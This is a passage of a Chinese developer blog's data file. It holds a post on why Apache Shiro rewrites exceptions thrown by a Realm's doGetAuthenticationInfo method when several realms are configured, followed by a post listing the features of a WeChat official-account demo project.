style=\"color:red\">&#x53EF;&#x662F;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x9879;&#x76EE;&#xFF0C;&#x53D1;&#x73B0;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x884C;&#x4E0D;&#x901A;&#x4E86;&#xFF0C;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#x5982;UnknownAccountException(&#x5305;&#x62EC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5F02;&#x5E38;)&#xFF0C;&#x5916;&#x90E8;&#x90FD;&#x65E0;&#x6CD5;&#x51C6;&#x786E;&#x6355;&#x6349;&#x3002;<br><br><a id=\"more\"></a><br><br>&#x5916;&#x90E8;login&#x6355;&#x6349;&#x7684;&#x5F02;&#x5E38;&#x7EDF;&#x4E00;&#x88AB;&#x6539;&#x5199;&#x4E3A; AuthenticationException&#x5F02;&#x5E38;(IncorrectCredentialsException&#x7B49;&#x5F02;&#x5E38;&#x7684;&#x7236;&#x7C7B;)&#xFF0C;&#x4E14;&#x5F02;&#x5E38;&#x7684;msg&#x5185;&#x5BB9;&#x4E5F;&#x88AB;&#x6539;&#x5199;&#x3002;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</font>\n\n\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/1.png\" alt=\"&#x56FE;1\"></p>\n<p>&#x539F;&#x56E0;&#x5728;subject.login(token)&#x7684;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x6E90;&#x7801;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/2.png\" alt=\"&#x56FE;2\"></p>\n<p>&#x6211;&#x4EEC;&#x8FDB;&#x5165;doSingleRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#x5916;&#x629B;&#x4E86;UnknownAccountException&#x7B49;&#x5F02;&#x5E38;&#x3002;<br>&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9879;&#x76EE;&#x4E2D;&#x53EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;realm&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x5916;&#x90E8;&#x662F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6355;&#x6349;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/3.png\" alt=\"&#x56FE;3\"></p>\n<p><font style=\"color:red\">&#x4F46;&#x662F;&#x6B64;&#x6B21;&#x9879;&#x76EE;&#x6211;&#x5B9A;&#x4E49;&#x4E86;&#x4E24;&#x4E2A;realm&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x5404;&#x79CD;&#x8BF7;&#x6C42;&#x643A;&#x5E26;&#x7684;&#x7684;token&#x3002;</font><br>&#x6211;&#x4EEC;&#x8FDB;&#x5165;doMultiRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/4.png\" alt=\"&#x56FE;4\"></p>\n<p>&#x518D;&#x8FDB;&#x5165;afterAllAttempts&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x5982;&#x56FE;5&#x3002;<br>&#x53D1;&#x73B0;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x90FD;&#x88AB;&#x7EDF;&#x4E00;&#x6539;&#x4E3A;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x4E14;msg&#x4E5F;&#x88AB;&#x6539;&#x5199;&#xFF0C;&#x6B63;&#x5982;&#x56FE;1&#x6240;&#x793A;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/5.png\" alt=\"&#x56FE;5\"></p>\n<h3 id=\"&#x7ED3;&#x8BBA;\"><a href=\"#&#x7ED3;&#x8BBA;\" class=\"headerlink\" title=\"&#x7ED3;&#x8BBA;\"></a>&#x7ED3;&#x8BBA;</h3><p>&#x5916;&#x90E8;&#x65E0;&#x6CD5;&#x6355;&#x6349;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6E90;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x81EA;&#x5DF1;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x95EE;&#x9898;&#x3002;<br>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6539;&#x5199;&#x6E90;&#x7801;&#x7684;&#x672C;&#x4E8B;&#xFF0C;&#x90A3;&#x4E48;&#x5916;&#x90E8;&#x60F3;&#x8981;&#x6355;&#x6349;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#xFF0C;&#x5E76;&#x5728;&#x524D;&#x7AEF;&#x663E;&#x793A;&#x5404;&#x79CD;&#x63D0;&#x793A;&#x8BED;&#xFF0C;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p>\n<p>&#x6211;&#x7684;&#x4E34;&#x65F6;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;doGetAuthenticationInfo&#x53EA;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;<br>&#x5916;&#x90E8;&#x76F4;&#x63A5;&#x6355;&#x6349;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x5404;&#x79CD;&#x9A8C;&#x8BC1;&#x4ECE;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x79FB;&#x81F3;login&#x3002;</p>\n","excerpt":"<p>shiro&#x6743;&#x9650;&#x6846;&#x67B6;&#xFF0C;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#x7684;subject.login(token)&#x4F1A;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserNamePasswordRealm&#x7C7B;&#x7684;doGetAuthenticationInfo&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65B9;&#x6CD5;</p>\n<p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#xFF0C;doGetAuthenticationInfo&#x5199;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">protected AuthenticationInfo <span class=\"keyword\">do</span>GetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException {</span><br><span class=\"line\">\tUsernamePasswordToken token = (UsernamePasswordToken) authcToken;</span><br><span class=\"line\">\tUser loginUser = userService.getUserByName(token.getUsername());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ObjectUtils.isEmpty(loginUser)) {</span><br><span class=\"line\">\t\tthrow new UnknownAccountException();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){</span><br><span class=\"line\">\t\tthrow new IncorrectCredentialsException();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t//&#x5176;&#x4ED6;&#x5404;&#x79CD;&#x9A8C;&#x8BC1;</span><br><span class=\"line\">\t&#x3002;&#x3002;&#x3002;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>login&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/login&quot;</span>, method = RequestMethod.POST)</span><br><span class=\"line\">public String <span class=\"keyword\">do</span>UserLogin(User user, HttpServletRequest request, Model model) {</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tSubject subject = SecurityUtils.getSubject();</span><br><span class=\"line\">\tUsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord());</span><br><span class=\"line\">\ttry {</span><br><span class=\"line\">\t\tsubject.login(token);</span><br><span class=\"line\">\t} catch (UnknownAccountException uae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (IncorrectCredentialsException ice) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (LockedAccountException lae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (ExcessiveAttemptsException eae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (AuthenticationException ae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t...</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<hr>\n<font style=\"color:red\">&#x53EF;&#x662F;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x9879;&#x76EE;&#xFF0C;&#x53D1;&#x73B0;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x884C;&#x4E0D;&#x901A;&#x4E86;&#xFF0C;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#x5982;UnknownAccountException(&#x5305;&#x62EC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5F02;&#x5E38;)&#xFF0C;&#x5916;&#x90E8;&#x90FD;&#x65E0;&#x6CD5;&#x51C6;&#x786E;&#x6355;&#x6349;&#x3002;<br><br></font>","more":"<br><br>&#x5916;&#x90E8;login&#x6355;&#x6349;&#x7684;&#x5F02;&#x5E38;&#x7EDF;&#x4E00;&#x88AB;&#x6539;&#x5199;&#x4E3A; AuthenticationException&#x5F02;&#x5E38;(IncorrectCredentialsException&#x7B49;&#x5F02;&#x5E38;&#x7684;&#x7236;&#x7C7B;)&#xFF0C;&#x4E14;&#x5F02;&#x5E38;&#x7684;msg&#x5185;&#x5BB9;&#x4E5F;&#x88AB;&#x6539;&#x5199;&#x3002;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;\n\n\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/1.png\" alt=\"&#x56FE;1\"></p>\n<p>&#x539F;&#x56E0;&#x5728;subject.login(token)&#x7684;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x6E90;&#x7801;&#x6709;&#x8FD9;&#x4E48;&#x4E00;&#x6BB5;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/2.png\" alt=\"&#x56FE;2\"></p>\n<p>&#x6211;&#x4EEC;&#x8FDB;&#x5165;doSingleRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#x5916;&#x629B;&#x4E86;UnknownAccountException&#x7B49;&#x5F02;&#x5E38;&#x3002;<br>&#x6240;&#x4EE5;&#x5982;&#x679C;&#x9879;&#x76EE;&#x4E2D;&#x53EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;realm&#xFF0C;&#x6BD4;&#x5982;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x5916;&#x90E8;&#x662F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6355;&#x6349;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/3.png\" alt=\"&#x56FE;3\"></p>\n<p><font style=\"color:red\">&#x4F46;&#x662F;&#x6B64;&#x6B21;&#x9879;&#x76EE;&#x6211;&#x5B9A;&#x4E49;&#x4E86;&#x4E24;&#x4E2A;realm&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x5404;&#x79CD;&#x8BF7;&#x6C42;&#x643A;&#x5E26;&#x7684;&#x7684;token&#x3002;</font><br>&#x6211;&#x4EEC;&#x8FDB;&#x5165;doMultiRealmAuthentication&#x65B9;&#x6CD5;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/4.png\" alt=\"&#x56FE;4\"></p>\n<p>&#x518D;&#x8FDB;&#x5165;afterAllAttempts&#x7684;&#x5B9E;&#x73B0;&#x7C7B;&#xFF0C;&#x5982;&#x56FE;5&#x3002;<br>&#x53D1;&#x73B0;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x90FD;&#x88AB;&#x7EDF;&#x4E00;&#x6539;&#x4E3A;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x4E14;msg&#x4E5F;&#x88AB;&#x6539;&#x5199;&#xFF0C;&#x6B63;&#x5982;&#x56FE;1&#x6240;&#x793A;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/5.png\" alt=\"&#x56FE;5\"></p>\n<h3 id=\"&#x7ED3;&#x8BBA;\"><a href=\"#&#x7ED3;&#x8BBA;\" class=\"headerlink\" title=\"&#x7ED3;&#x8BBA;\"></a>&#x7ED3;&#x8BBA;</h3><p>&#x5916;&#x90E8;&#x65E0;&#x6CD5;&#x6355;&#x6349;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6E90;&#x7801;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x81EA;&#x5DF1;&#x7684;&#x4EE3;&#x7801;&#x6709;&#x95EE;&#x9898;&#x3002;<br>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6539;&#x5199;&#x6E90;&#x7801;&#x7684;&#x672C;&#x4E8B;&#xFF0C;&#x90A3;&#x4E48;&#x5916;&#x90E8;&#x60F3;&#x8981;&#x6355;&#x6349;&#x5404;&#x79CD;&#x5F02;&#x5E38;&#xFF0C;&#x5E76;&#x5728;&#x524D;&#x7AEF;&#x663E;&#x793A;&#x5404;&#x79CD;&#x63D0;&#x793A;&#x8BED;&#xFF0C;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p>\n<p>&#x6211;&#x7684;&#x4E34;&#x65F6;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;doGetAuthenticationInfo&#x53EA;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;<br>&#x5916;&#x90E8;&#x76F4;&#x63A5;&#x6355;&#x6349;AuthenticationException&#x5F02;&#x5E38;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x5404;&#x79CD;&#x9A8C;&#x8BC1;&#x4ECE;doGetAuthenticationInfo&#x65B9;&#x6CD5;&#x79FB;&#x81F3;login&#x3002;</p>"},{"title":"微信公众号开发","date":"2016-11-21T10:53:00.000Z","toc":false,"_content":"\n最近进行了微信公众号的预研，目前支持的功能如下\n- 支持关键字回复，目前能回复图文信息。 \n- 支持自定义菜单创建及菜单事件响应。 \n- 支持各消息类型的识别。目前可以识别用户发送的文本、图片、声音、地址和链接信息等。\n- 支持拍照答题。微信公众号内带拍照功能，用户发送图片后，后端可调用接口进行图片识别，并回复图文信息。 \n- 通过点击菜单，目前可以进入自定义页面。后期前端可以介入进行相关HTML5开发。 \n- 支持用户信息的获取。后期可以进行个性化业务处理。\n- 支持用户分组查询、用户分组创建、用户分组修改等。\n- 支持临时/永久带参二维码的创建。\n- 支持媒体文件的上传与下载。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/1.png)\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/2.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/3.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/4.png)\n\n---\n\n项目实现比较简单，使用的是servlet，没有使用其他架构和多余代码，用户可以直接查看核心业务类CoreService。\nGithub地址：https://github.com/Wasim37/weixin_demo.git (持续更新中)\n\n","source":"_posts/微信公众号开发.md","raw":"---\ntitle: 微信公众号开发\ncategories:\n  - 其他技术\ntags:\n  - 微信公众号\ndate: 2016-11-21 18:53:00\ntoc: false\n---\n\n最近进行了微信公众号的预研，目前支持的功能如下\n- 支持关键字回复，目前能回复图文信息。 \n- 支持自定义菜单创建及菜单事件响应。 \n- 支持各消息类型的识别。目前可以识别用户发送的文本、图片、声音、地址和链接信息等。\n- 支持拍照答题。微信公众号内带拍照功能，用户发送图片后，后端可调用接口进行图片识别，并回复图文信息。 \n- 通过点击菜单，目前可以进入自定义页面。后期前端可以介入进行相关HTML5开发。 \n- 支持用户信息的获取。后期可以进行个性化业务处理。\n- 支持用户分组查询、用户分组创建、用户分组修改等。\n- 支持临时/永久带参二维码的创建。\n- 支持媒体文件的上传与下载。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/1.png)\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/2.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/3.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/4.png)\n\n---\n\n项目实现比较简单，使用的是servlet，没有使用其他架构和多余代码，用户可以直接查看核心业务类CoreService。\nGithub地址：https://github.com/Wasim37/weixin_demo.git (持续更新中)\n\n","slug":"微信公众号开发","published":1,"updated":"2016-12-05T07:41:16.402Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulel004rgwtmeoq65a8k","content":"<p>&#x6700;&#x8FD1;&#x8FDB;&#x884C;&#x4E86;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x9884;&#x7814;&#xFF0C;&#x76EE;&#x524D;&#x652F;&#x6301;&#x7684;&#x529F;&#x80FD;&#x5982;&#x4E0B;</p>\n<ul>\n<li>&#x652F;&#x6301;&#x5173;&#x952E;&#x5B57;&#x56DE;&#x590D;&#xFF0C;&#x76EE;&#x524D;&#x80FD;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; </li>\n<li>&#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#x83DC;&#x5355;&#x521B;&#x5EFA;&#x53CA;&#x83DC;&#x5355;&#x4E8B;&#x4EF6;&#x54CD;&#x5E94;&#x3002; </li>\n<li>&#x652F;&#x6301;&#x5404;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x7684;&#x8BC6;&#x522B;&#x3002;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7684;&#x6587;&#x672C;&#x3001;&#x56FE;&#x7247;&#x3001;&#x58F0;&#x97F3;&#x3001;&#x5730;&#x5740;&#x548C;&#x94FE;&#x63A5;&#x4FE1;&#x606F;&#x7B49;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x62CD;&#x7167;&#x7B54;&#x9898;&#x3002;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x5185;&#x5E26;&#x62CD;&#x7167;&#x529F;&#x80FD;&#xFF0C;&#x7528;&#x6237;&#x53D1;&#x9001;&#x56FE;&#x7247;&#x540E;&#xFF0C;&#x540E;&#x7AEF;&#x53EF;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x8FDB;&#x884C;&#x56FE;&#x7247;&#x8BC6;&#x522B;&#xFF0C;&#x5E76;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; </li>\n<li>&#x901A;&#x8FC7;&#x70B9;&#x51FB;&#x83DC;&#x5355;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x9875;&#x9762;&#x3002;&#x540E;&#x671F;&#x524D;&#x7AEF;&#x53EF;&#x4EE5;&#x4ECB;&#x5165;&#x8FDB;&#x884C;&#x76F8;&#x5173;HTML5&#x5F00;&#x53D1;&#x3002; </li>\n<li>&#x652F;&#x6301;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x7684;&#x83B7;&#x53D6;&#x3002;&#x540E;&#x671F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4E2A;&#x6027;&#x5316;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x67E5;&#x8BE2;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x521B;&#x5EFA;&#x3001;&#x7528;&#x6237;&#x5206;&#x7EC4;&#x4FEE;&#x6539;&#x7B49;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x4E34;&#x65F6;/&#x6C38;&#x4E45;&#x5E26;&#x53C2;&#x4E8C;&#x7EF4;&#x7801;&#x7684;&#x521B;&#x5EFA;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x5A92;&#x4F53;&#x6587;&#x4EF6;&#x7684;&#x4E0A;&#x4F20;&#x4E0E;&#x4E0B;&#x8F7D;&#x3002;</li>\n</ul>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/1.png\" alt=\"\"><br><a id=\"more\"></a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/2.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/3.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/4.png\" alt=\"\"></p>\n<hr>\n<p>&#x9879;&#x76EE;&#x5B9E;&#x73B0;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x662F;servlet&#xFF0C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x67B6;&#x6784;&#x548C;&#x591A;&#x4F59;&#x4EE3;&#x7801;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x67E5;&#x770B;&#x6838;&#x5FC3;&#x4E1A;&#x52A1;&#x7C7B;CoreService&#x3002;<br>Github&#x5730;&#x5740;&#xFF1A;<a href=\"https://github.com/Wasim37/weixin_demo.git\" target=\"_blank\" rel=\"external\">https://github.com/Wasim37/weixin_demo.git</a> (&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;)</p>\n","excerpt":"<p>&#x6700;&#x8FD1;&#x8FDB;&#x884C;&#x4E86;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x9884;&#x7814;&#xFF0C;&#x76EE;&#x524D;&#x652F;&#x6301;&#x7684;&#x529F;&#x80FD;&#x5982;&#x4E0B;</p>\n<ul>\n<li>&#x652F;&#x6301;&#x5173;&#x952E;&#x5B57;&#x56DE;&#x590D;&#xFF0C;&#x76EE;&#x524D;&#x80FD;&#x56DE;&#x590D;&#x56FE;&#x6587;&#x4FE1;&#x606F;&#x3002; </li>\n<li>&#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#x83DC;&#x5355;&#x521B;&#x5EFA;&#x53CA;&#x83DC;&#x5355;&#x4E8B;&#x4EF6;&#x54CD;&#x5E94;&#x3002; 